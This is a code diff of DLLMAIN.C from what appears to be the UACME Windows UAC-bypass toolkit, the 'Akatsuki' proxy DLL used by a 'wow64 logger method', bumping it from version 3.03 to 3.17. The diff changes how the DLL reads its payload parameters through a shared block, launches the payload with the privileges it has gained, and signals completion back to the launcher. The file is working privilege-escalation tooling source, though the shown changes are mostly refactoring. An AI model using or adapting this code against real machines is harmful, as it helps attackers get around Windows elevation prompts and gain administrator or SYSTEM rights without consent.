@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2016 - 2018
+*  (C) COPYRIGHT AUTHORS, 2016 - 2019
 *
 *  TITLE:       DLLMAIN.C
 *
-*  VERSION:     3.03
+*  VERSION:     3.17
 *
-*  DATE:        11 Oct 2018
+*  DATE:        20 Mar 2019
 *
 *  Proxy dll entry point, Akatsuki.
 *  Special dll for wow64 logger method.
@@ -23,24 +23,15 @@
 #error ANSI build is not supported
 #endif
 
-//disable nonmeaningful warnings.
-#pragma warning(push)
-#pragma warning(disable: 4005 4201)
-
-#include <windows.h>
-#include "shared\ntos.h"
-#include <ntstatus.h>
-#include "shared\minirtl.h"
-#include "shared\util.h"
-#include "shared\windefend.h"
-
-#pragma warning(pop)
-
+#include "shared\shared.h"
 #include "shared\libinc.h"
 
 #define LoadedMsg      TEXT("Akatsuki lock and loaded")
 
 HANDLE g_SyncMutant = NULL;
+
+UACME_PARAM_BLOCK g_SharedParams;
+
 
 /*
 * DummyFunc
@@ -62,7 +53,7 @@ VOID WINAPI DummyFunc(
 *
 * Purpose:
 *
-* TBD.
+* Dump runtime info to the file, this routine is only for debug builds.
 *
 */
 VOID DbgDumpRuntimeInfo()
@@ -112,37 +103,49 @@ VOID DefaultPayload(
     VOID
 )
 {
-    BOOL bIsLocalSystem = FALSE, bReadSuccess;
-    PWSTR lpParameter = NULL;
-    ULONG cbParameter = 0L;
-    ULONG SessionId = 0;
+    BOOL bSharedParamsReadOk;
+    UINT ExitCode;
+    PWSTR lpParameter;
+    ULONG cbParameter;
+
+    BOOL bIsLocalSystem = FALSE;
+    ULONG SessionId;
 
     if (ucmCreateSyncMutant(&g_SyncMutant) == STATUS_OBJECT_NAME_COLLISION)
         ExitProcess(0);
 
+    //
+    // Read shared params block.
+    //
+    RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
+    bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
+    if (bSharedParamsReadOk) {
+        lpParameter = g_SharedParams.szParameter;
+        cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
+        SessionId = g_SharedParams.SessionId;
+    }
+    else {
+        lpParameter = NULL;
+        cbParameter = 0UL;
+        SessionId = 0;
+    }
+
     ucmIsLocalSystem(&bIsLocalSystem);
 
-    bReadSuccess = ucmReadParameters(
-        &lpParameter,
-        &cbParameter,
-        NULL,
-        &SessionId,
-        bIsLocalSystem);
-
-    ucmLaunchPayload2(
+    ExitCode = (ucmLaunchPayload2(
         bIsLocalSystem, 
         SessionId, 
         lpParameter, 
-        cbParameter);
+        cbParameter) != FALSE);
 
-    if (bReadSuccess) {
-        RtlFreeHeap(
-            NtCurrentPeb()->ProcessHeap,
-            0,
-            lpParameter);
+    //
+    // Notify Akagi.
+    //
+    if (bSharedParamsReadOk) {
+        ucmSetCompletion(g_SharedParams.szSignalObject);
     }
 
-    ExitProcess(0);
+    ExitProcess(ExitCode);
 }
 
 /*
